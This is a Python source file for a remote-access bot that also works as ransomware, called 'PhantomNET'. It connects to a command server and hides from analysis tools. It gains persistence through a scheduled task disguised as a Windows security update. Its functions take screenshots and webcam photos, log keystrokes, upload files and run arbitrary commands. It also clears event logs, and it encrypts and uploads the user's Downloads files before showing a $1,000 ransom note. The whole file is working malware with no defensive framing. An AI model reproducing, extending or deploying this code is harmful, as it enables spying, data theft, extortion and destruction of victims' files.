import subprocess
import os
import sys
import socket
import platform
import time
import random
import threading
import base64

required_modules = ["setuptools", "urllib3", "socket", "threading", "base64", "requests", "ctypes", "shutil", "sys", "subprocess", "winreg", "wmi", "requests", "setuptools", "psutil", "pynput", "pyautogui", "opencv-python", "aiohttp", "cryptography", "pywin32", "psutil", "Pillow", "pyscreeze", "GPUtil", "tabulate", "datetime"]
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        subprocess.call([sys.executable, "-m", "pip", "install", module, "--break-system-packages"])

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import psutil
from datetime import datetime
import setuptools
import GPUtil
from tabulate import tabulate

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

# ============
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
BOT_ID = socket.gethostbyname(socket.gethostname())
SERVER_URL = "https://192.168.100.66:5000"
encryption_in_progress = False

# ============
import ctypes
import os
import sys
import subprocess
import psutil

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_analysis_tools():
    suspicious = [
        "wireshark", "fiddler", "procmon", "procexp", "ida", "x32dbg", "x64dbg",
        "ollydbg", "sandboxie"
    ]
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and any(tool in proc.info['name'].lower() for tool in suspicious):
                send_result("analysis", f"[!] Tool detected: {proc.info['name']}")
                os.remove(__file__)
                sys.exit()
        except:
            pass

    if sys.gettrace():
        send_result("analysis", "[!] Debugger detected")
        os.remove(__file__)
        sys.exit()

def setup_persistence():
    check_analysis_tools()

    if not is_admin():
        send_result("persistence", "[!] Not admin. Trying to elevate...")
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, __file__, None, 0
            )
        except Exception as e:
            send_result("persistence", f"[!] Elevation failed: {e}")
        sys.exit()

    try:
        # تحديد المسارات
        bot_path = os.path.abspath(__file__)
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        command = f'"{pythonw_path}" "{bot_path}"'
        task_name = "WindowsSecurityUpdate"

        # تحقق إن ما في مهمة موجودة بنفس الاسم
        query = subprocess.run(
            f'schtasks /query /tn "{task_name}"',
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        if "ERROR:" in query.stdout or "ERROR:" in query.stderr:
            # إنشاء المهمة المجدولة
            task_cmd = f'schtasks /create /f /sc onlogon /rl highest /tn "{task_name}" /tr {command}'
            subprocess.run(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            send_result("persistence", f"[✓] Scheduled task created: {command}")
        else:
            send_result("persistence", "[*] Scheduled task already exists")

    except Exception as e:
        send_result("persistence", f"[!] Failed to create scheduled task: {e}")

#-------------------------
def register_bot():
    try:
        requests.post(f"{SERVER_URL}/register", json={"bot_id": BOT_ID}, verify=False)
        print(f"[✓] Registered bot {BOT_ID}")
    except Exception as e:
        print(f"[!] Registration failed: {e}")
register_bot()


def get_command():
    try:
        r = requests.get(f"{SERVER_URL}/get_command/{BOT_ID}", verify=False)
        if r.status_code == 200:
            return r.json().get("command")
    except:
        return None

def send_result(command, result):
    try:
        requests.post(f"{SERVER_URL}/send_result", json={
            "bot_id": BOT_ID,
            "command": command,
            "result": result
        }, verify=False)
    except:
        pass

def upload_file(path, delete_after=False):
    try:
        with open(path, "rb") as f:
            response = requests.post(f"{SERVER_URL}/upload_file/", files={"file": f}, verify=False)
        if response.status_code == 200:
            if delete_after:
                os.remove(path)
                return f"[✓] Uploaded and deleted: {path}"
            else:
                return f"[✓] Uploaded: {path}"
        else:
            return f"[!] Upload failed with status: {response.status_code}"
    except Exception as e:
        return f"[!] Upload failed: {e}"

# ====== Screenshot ======
def take_screenshot():
    try:
        import pyautogui
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        pyautogui.screenshot(filename)
        return upload_file(filename, delete_after=True)
    except Exception as e:
        return f"[!] Screenshot failed: {e}"

# ====== Webcam Snapshot ======
def take_webcam_photo():
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if not ret:
            return "[!] Webcam not accessible"
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"webcam_{timestamp}.png"
        cv2.imwrite(filename, frame)
        cam.release()
        return upload_file(filename, delete_after=True)
    except Exception as e:
        return f"[!] Webcam failed: {e}"

# ====== System Report ======
def get_system_report():
    output = []
    
    uname = platform.uname()
    output.append(f"{'='*40} System Information {'='*40}")
    output.append(f"System: {uname.system}")
    output.append(f"Node Name: {uname.node}")
    output.append(f"Release: {uname.release}")
    output.append(f"Version: {uname.version}")
    output.append(f"Machine: {uname.machine}")
    output.append(f"Processor: {uname.processor}")
    
    output.append(f"{'='*40} Boot Time {'='*40}")
    bt = datetime.fromtimestamp(psutil.boot_time())
    output.append(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")

    output.append(f"{'='*40} CPU Info {'='*40}")
    output.append(f"Physical cores: {psutil.cpu_count(logical=False)}")
    output.append(f"Total cores: {psutil.cpu_count(logical=True)}")
    cpufreq = psutil.cpu_freq()
    output.append(f"Max Frequency: {cpufreq.max:.2f}Mhz")
    output.append(f"Min Frequency: {cpufreq.min:.2f}Mhz")
    output.append(f"Current Frequency: {cpufreq.current:.2f}Mhz")
    output.append("CPU Usage Per Core:")
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        output.append(f"Core {i}: {percentage}%")
    output.append(f"Total CPU Usage: {psutil.cpu_percent()}%")

    svmem = psutil.virtual_memory()
    output.append(f"{'='*40} Memory Info {'='*40}")
    output.append(f"Total: {get_size(svmem.total)}")
    output.append(f"Available: {get_size(svmem.available)}")
    output.append(f"Used: {get_size(svmem.used)}")
    output.append(f"Percentage: {svmem.percent}%")
    swap = psutil.swap_memory()
    output.append(f"{'='*20} SWAP {'='*20}")
    output.append(f"Total: {get_size(swap.total)}")
    output.append(f"Free: {get_size(swap.free)}")
    output.append(f"Used: {get_size(swap.used)}")
    output.append(f"Percentage: {swap.percent}%")

    output.append(f"{'='*40} Disk Info {'='*40}")
    for partition in psutil.disk_partitions():
        output.append(f"=== Device: {partition.device} ===")
        output.append(f"Mountpoint: {partition.mountpoint}")
        output.append(f"File system type: {partition.fstype}")
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            output.append(f"Total Size: {get_size(usage.total)}")
            output.append(f"Used: {get_size(usage.used)}")
            output.append(f"Free: {get_size(usage.free)}")
            output.append(f"Percentage: {usage.percent}%")
        except PermissionError:
            continue
    io = psutil.disk_io_counters()
    output.append(f"Total Read: {get_size(io.read_bytes)}")
    output.append(f"Total Write: {get_size(io.write_bytes)}")

    output.append(f"{'='*40} Network Info {'='*40}")
    for interface, addresses in psutil.net_if_addrs().items():
        for address in addresses:
            output.append(f"=== Interface: {interface} ===")
            if str(address.family) == 'AddressFamily.AF_INET':
                output.append(f"IP Address: {address.address}")
                output.append(f"Netmask: {address.netmask}")
                output.append(f"Broadcast IP: {address.broadcast}")
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                output.append(f"MAC Address: {address.address}")
                output.append(f"Netmask: {address.netmask}")
                output.append(f"Broadcast MAC: {address.broadcast}")
    net_io = psutil.net_io_counters()
    output.append(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
    output.append(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")

    output.append(f"{'='*40} GPU Info {'='*40}")
    try:
        gpus = GPUtil.getGPUs()
        list_gpus = []
        for gpu in gpus:
            list_gpus.append((
                gpu.id, gpu.name, f"{gpu.load*100:.1f}%", f"{gpu.memoryFree}MB",
                f"{gpu.memoryUsed}MB", f"{gpu.memoryTotal}MB", f"{gpu.temperature} °C", gpu.uuid
            ))
        output.append(tabulate(list_gpus, headers=("id", "name", "load", "free memory",
                                                   "used memory", "total memory",
                                                   "temperature", "uuid")))
    except:
        output.append("GPU Info: Not Available")

    output.append(f"{'='*40} Antivirus Info {'='*40}")
    output.append(detect_local_antivirus())

    return "\n".join(output)

import subprocess

def interpret_product_state(state):
    state = int(state)
    status = []
    if (state & 0x10):
        status.append("Enabled")
    else:
        status.append("Disabled")
    if (state & 0x100):
        status.append("Up-to-date")
    else:
        status.append("Outdated")
    return ", ".join(status)

def get_defender_status_details():
    try:
        result = subprocess.run(
            ["powershell", "-Command", "Get-MpComputerStatus | Select-Object AntivirusEnabled, AntivirusSignatureLastUpdated, FullScanEndTime, AMServiceEnabled | Format-List"],
            capture_output=True, text=True, timeout=5
        )
        output = result.stdout.strip()
        formatted = ""
        for line in output.splitlines():
            if ":" in line:
                key, value = line.split(":", 1)
                formatted += f"- {key.strip()}: {value.strip()}\n"
        return formatted if formatted else "Defender details not available"
    except Exception as e:
        return f"Error retrieving Defender status: {e}"

def detect_local_antivirus():
    try:
        if IS_WINDOWS:
            import wmi
            w = wmi.WMI(namespace="root\\SecurityCenter2")
            av_list = []
            for av in w.AntiVirusProduct():
                name = av.displayName
                path = av.pathToSignedProductExe or "Unknown path"
                state = interpret_product_state(av.productState)

                details = ""
                if "defender" in name.lower():
                    details = "\n" + get_defender_status_details()

                av_list.append(f"{name} - {state} - Path: {path}{details}")
            return "\n\n".join(av_list) if av_list else "No antivirus found or insufficient privileges"
        else:
            return "Unsupported on this OS"
    except Exception as e:
        return f"Detection failed: {e}"


# ====== Keylogger (Cross-platform Unified) ======

from pynput import keyboard
from threading import Thread

keylogger_active = False
keylog_buffer = []
keylog_file = None
keylog_listener = None

def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(str(key))
        if len(keylog_buffer) >= 50:
            save_keys()
    except:
        pass

def save_keys():
    global keylog_buffer
    os.makedirs("C:\\temp" if IS_WINDOWS else "/tmp", exist_ok=True)
    with open(keylog_file, "a", encoding="utf-8") as f:
        f.write("\n".join(keylog_buffer) + "\n")
    keylog_buffer.clear()

def start_keylogger():
    global keylogger_active, keylog_file, keylog_listener
    if keylogger_active:
        return "[!] Keylogger already running"
    keylog_file = os.path.join("C:\\temp" if IS_WINDOWS else "/tmp", f"keylog_{time.strftime('%Y%m%d-%H%M%S')}.log")
    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    keylogger_active = True
    return "[✓] Keylogger started"

def stop_keylogger():
    global keylogger_active, keylog_listener
    if not keylogger_active:
        return "[!] Keylogger is not running"
    keylogger_active = False
    if keylog_listener:
        keylog_listener.stop()
    save_keys()
    return upload_file(keylog_file, delete_after=True) if keylog_file else "[!] No keylog file to upload"

# ====== clear ======
def clear_trace():
    if not IS_WINDOWS:
        return "[!] clear_trace is only supported on Windows systems."

    import shutil
    import subprocess

    deleted = []
    errors = []

    try:
        paths = [
            os.getenv('TEMP'),
            os.path.join(os.getenv('APPDATA') or "", 'Microsoft', 'Windows', 'Recent'),
            os.path.expanduser('~\\AppData\\Local\\Temp'),
            "C:\\Windows\\Temp",
            "C:\\temp",
            os.getcwd()
        ]

        keywords = ["log", "trace", ".pyc", "keylog", "sysinfo"]
        folder_keywords = ["screenshots", "uploads", "webcam", "tempdata"]

        for path in paths:
            if path and os.path.exists(path):
                for item in os.listdir(path):
                    full = os.path.join(path, item)
                    try:
                        # حذف ملفات تحتوي على كلمات معينة
                        if os.path.isfile(full) and any(x in item.lower() for x in keywords):
                            os.remove(full)
                            deleted.append(full)

                        # حذف مجلدات مؤقتة
                        elif os.path.isdir(full) and any(k in item.lower() for k in folder_keywords):
                            shutil.rmtree(full, ignore_errors=True)
                            deleted.append(full + "\\")
                    except Exception as e:
                        errors.append(f"{full}: {e}")

        # تنظيف سجل الأحداث (يحتاج صلاحيات مسؤول)
        for log in ["Application", "System", "Security"]:
            try:
                result = subprocess.run(["wevtutil", "cl", log], capture_output=True, text=True)
                if result.returncode == 0:
                    deleted.append(f"Cleared {log} Event Log")
                else:
                    errors.append(f"{log} log: {result.stderr.strip()}")
            except Exception as e:
                errors.append(f"{log} log: {e}")

    except Exception as e:
        errors.append(str(e))

    return f"[✓] Cleared traces: {len(deleted)} items.\n[!] Errors: {len(errors)}"

# -----------------------
def download_file(url):
    try:
        local_filename = url.split("/")[-1]
        r = requests.get(url, stream=True, verify=False)
        with open(local_filename, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        return f"[✓] Downloaded: {local_filename}"
    except Exception as e:
        return f"[!] Download failed: {e}"

# ============
def execute_system_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode(errors="ignore")
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="ignore")

# ============


import os, time, socket, base64, requests
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

DOWNLOADS = str(Path.home() / "Downloads")
KEY_FILE = os.path.join(DOWNLOADS, "key.txt")
AES_KEY = os.urandom(32)
BOT_PRIVATE_KEY = ec.generate_private_key(ec.SECP384R1())

# === تشفير المفتاح ورفعه للسيرفر ===
def submit_encrypted_key():
    try:
        pub_resp = requests.get(f"{SERVER_URL}/pubkey", verify=False)
        server_pub_key = serialization.load_pem_public_key(base64.b64decode(pub_resp.json()["public_key"]))
        shared_key = BOT_PRIVATE_KEY.exchange(ec.ECDH(), server_pub_key)
        derived_key = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b'handshake data').derive(shared_key)

        nonce = os.urandom(12)
        cipher = Cipher(algorithms.AES(derived_key), modes.GCM(nonce))
        encryptor = cipher.encryptor()
        encrypted_key = encryptor.update(AES_KEY) + encryptor.finalize()

        with open(KEY_FILE, "wb") as f:
            f.write(nonce + encrypted_key + encryptor.tag)

        with open(KEY_FILE, "rb") as f:
            requests.post(f"{SERVER_URL}/upload_file/", files={"file": ("key.txt", f)}, verify=False)

        os.remove(KEY_FILE)
        return True
    except Exception as e:
        print(f"[!] Failed to submit key: {e}")
        return False

# === تشفير الملفات ===
def encrypt_file(filepath, aes_key):
    with open(filepath, "rb") as f:
        data = f.read()

    nonce = os.urandom(12)
    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()

    encrypted_path = filepath + ".enc"
    with open(encrypted_path, "wb") as f:
        f.write(nonce + ciphertext + encryptor.tag)

    os.remove(filepath)
    return encrypted_path

# === تنفيذ أمر التشفير ===
def trigger_encryption():
    global encryption_in_progress
    encryption_in_progress = True

    try:
        while encryption_in_progress:
            print("[*] Encrypting batch...")
            print("[*] Starting encryption...")

            for file in os.listdir(DOWNLOADS):
                full_path = os.path.join(DOWNLOADS, file)
                if os.path.isfile(full_path) and not file.endswith(".enc"):
                    print(f"[+] Uploading original file: {file}")
                    with open(full_path, "rb") as f:
                        requests.post(
                            f"{SERVER_URL}/upload_file/",
                            files={"file": (file, f)},
                            data={"folder": "O File"},
                            verify=False
                        )

            print("[*] Downloading AES key from server...")
            key_resp = requests.get(f"{SERVER_URL}/files/key.txt", verify=False)
            key_path = os.path.join(DOWNLOADS, "key.txt")
            with open(key_path, "wb") as f:
                f.write(key_resp.content)

            with open(key_path, "rb") as f:
                encrypted = f.read()

            nonce, ciphertext, tag = encrypted[:12], encrypted[12:-16], encrypted[-16:]

            print("[*] Deriving AES key using ECDH + HKDF...")
            server_pub_resp = requests.get(f"{SERVER_URL}/pubkey", verify=False)
            server_pub_key = serialization.load_pem_public_key(base64.b64decode(server_pub_resp.json()["public_key"]))

            shared_key = BOT_PRIVATE_KEY.exchange(ec.ECDH(), server_pub_key)
            derived_key = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b'handshake data'
            ).derive(shared_key)

            decryptor = Cipher(algorithms.AES(derived_key), modes.GCM(nonce, tag)).decryptor()
            aes_key = decryptor.update(ciphertext) + decryptor.finalize()
            print(f"[*] AES Key Length: {len(aes_key)} bytes")

            print("[*] Encrypting files in Downloads...")
            for file in os.listdir(DOWNLOADS):
                full_path = os.path.join(DOWNLOADS, file)
                if os.path.isfile(full_path) and not file.endswith(".enc") and file != "key.txt":
                    print(f"[>] Encrypting: {file}")
                    enc_file = encrypt_file(full_path, aes_key)

                    with open(enc_file, "rb") as f:
                        requests.post(
                            f"{SERVER_URL}/upload_file/",
                            files={"file": (os.path.basename(enc_file), f)},
                            data={"folder": "Enc File"},
                            verify=False
                        )

        # 5. إنشاء رسالة فدية
            ransom_note_path = os.path.join(DOWNLOADS, "your file has been encrypted.txt")
            with open(ransom_note_path, "w") as f:
                f.write("Your files have been encrypted by PhantomNET.\n Contact us via email: phantomnet514@gmail.com \n -And be prepared to pay a ransom of $1,000 to recover and decrypt your files. ")

            ctypes.windll.user32.MessageBoxW(
                0,
                "WARNING: Your personal files have been encrypted!\n\n"
                "==================================================\n\n"
                "All your important documents, images, and files have\n"
                "been encrypted by PhantomNET Encryption Protocol.\n\n"
                "Do NOT try to turn off or restart your PC.\n"
                "Any attempts to recover files without the decryption key\n"
                "will result in permanent data loss.\n\n"
                "==================================================\n\n"
                "For recovery, contact: phantomnet514@gmail.com\n"
                "Ransom amount: $1,000\n"
                "You have 48 hours to respond.\n",
                "Windows Security Alert",
                0x10 | 0x0
            )

            print("[✓] Encryption complete.")
            os.remove(key_path)
            return "[✓] Encryption complete"

        time.sleep(10)
        print("[✓] Encryption loop stopped.")

    except Exception as e:
        print(f"[!] Encryption failed: {e}")
        encryption_in_progress = False
        return f"[!] Encryption failed: {e}"

# === تنفيذ أمر فك التشفير ===
def trigger_decryption():
    global encryption_in_progress
    if encryption_in_progress:
        print("[!] Encryption is active. Stopping it...")
        encryption_in_progress = False
        time.sleep(1)

    try:
        print("[*] Starting decryption...")
        key_resp = requests.get(f"{SERVER_URL}/files/key.txt", verify=False)
        if key_resp.status_code != 200:
            return "[!] Failed to download key.txt from server"
        with open(KEY_FILE, "wb") as f:
            f.write(key_resp.content)

        if not os.path.exists(KEY_FILE):
            return "[!] key.txt not found"

        # ECDH + AES-GCM
        with open(KEY_FILE, "rb") as f:
            encrypted = f.read()

        if len(encrypted) < 32:
            return "[!] Invalid key length"

        nonce, ciphertext, tag = encrypted[:12], encrypted[12:-16], encrypted[-16:]

        server_pub_resp = requests.get(f"{SERVER_URL}/pubkey", verify=False)
        server_pub_key = serialization.load_pem_public_key(
            base64.b64decode(server_pub_resp.json()["public_key"])
        )
        shared_key = BOT_PRIVATE_KEY.exchange(ec.ECDH(), server_pub_key)
        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'handshake data'
        ).derive(shared_key)

        decryptor = Cipher(algorithms.AES(derived_key), modes.GCM(nonce, tag)).decryptor()
        aes_key = decryptor.update(ciphertext) + decryptor.finalize()
        print(f"[*] AES key decrypted: {len(aes_key)} bytes")

        for file in os.listdir(DOWNLOADS):
            enc_path = os.path.join(DOWNLOADS, file)
            if (
                os.path.isfile(enc_path)
                and file.endswith(".enc")
                and "your file has been encrypted" not in file
            ):
                try:
                    print(f"[>] Decrypting: {file}")
                    with open(enc_path, "rb") as f:
                        raw = f.read()
                    nonce, ciphertext, tag = raw[:12], raw[12:-16], raw[-16:]
                    decryptor = Cipher(algorithms.AES(aes_key), modes.GCM(nonce, tag)).decryptor()
                    plain = decryptor.update(ciphertext) + decryptor.finalize()

                    with open(enc_path.replace(".enc", ""), "wb") as out_f:
                        out_f.write(plain)

                    os.remove(enc_path)

                except Exception as e:
                    print(f"[!] Failed to decrypt {file}: {e}")

        os.remove(KEY_FILE)
        print("[✓] Decryption complete.")
        return "[✓] Decryption complete"

    except Exception as e:
        print(f"[!] Decryption failed: {e}")
        return f"[!] Decryption failed: {e}"

# ============
def handle_command(command):
    if command == "screenshot snap":
        return take_screenshot()

    elif command == "webcam snap":
        return take_webcam_photo()

    elif command.startswith("upload "):
        path = command.split(" ", 1)[1]
        return upload_file(path)

    elif command.startswith("download "):
        parts = command.split(" ", 2)
        if len(parts) == 2:
            filename = parts[1]
            save_dir = "C:\\temp" if IS_WINDOWS else "/tmp"
        elif len(parts) == 3:
            filename = parts[1]
            save_dir = parts[2]
        else:
            return "[!] Invalid download command format. Use: download filename [destination_path]"

        url = f"{SERVER_URL}/files/{filename}"
        os.makedirs(save_dir, exist_ok=True)
        save_dir = os.path.expanduser(save_dir)
        os.makedirs(save_dir, exist_ok=True)
        save_path = os.path.join(save_dir, filename)

        try:
            r = requests.get(url, stream=True, timeout=20, verify=False)
            if r.status_code != 200:
                return f"[!] Download failed. Status: {r.status_code}"

            with open(save_path, "wb") as f:
                for chunk in r.iter_content(8192):
                    if chunk:
                        f.write(chunk)

            return f"[✓] File downloaded to: {save_path}"
        except Exception as e:
            return f"[!] Error: {e}"

    elif command == "encrypt":
        return trigger_encryption()
        
    elif command == "decrypt":
        return trigger_decryption()
    
    elif command == "keylogger start":
        return start_keylogger()

    elif command == "keylogger stop":
        return stop_keylogger()

    elif command == "sysinfo":
        report = get_system_report()
        filename = f"sysinfo_{time.strftime('%Y%m%d-%H%M%S')}.txt"
        with open(filename, "w") as f:
            f.write(report)
        return upload_file(filename, delete_after=True)

    elif command == "clear_trace":
        return clear_trace()

    elif command.startswith("cd "):
        try:
            os.chdir(command.split(" ", 1)[1])
            return "[✓] Directory changed"
        except:
            return "[!] Failed to change directory"

    else:
        return execute_system_command(command)

# ============
def main_loop():
    send_result("status", "[*] main_loop started")
    print("[*] Bot is running...")
    register_bot()
    submitted = submit_encrypted_key()
    if submitted:
        print("[✓] AES key submitted to server.")

    while True:
        try:
            cmd = get_command()
            if cmd:
                print(f"[>] Command received: {cmd}")
                result = handle_command(cmd)
                send_result(cmd, result)
            time.sleep(random.randint(3, 7))
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    setup_persistence()
    main_loop()
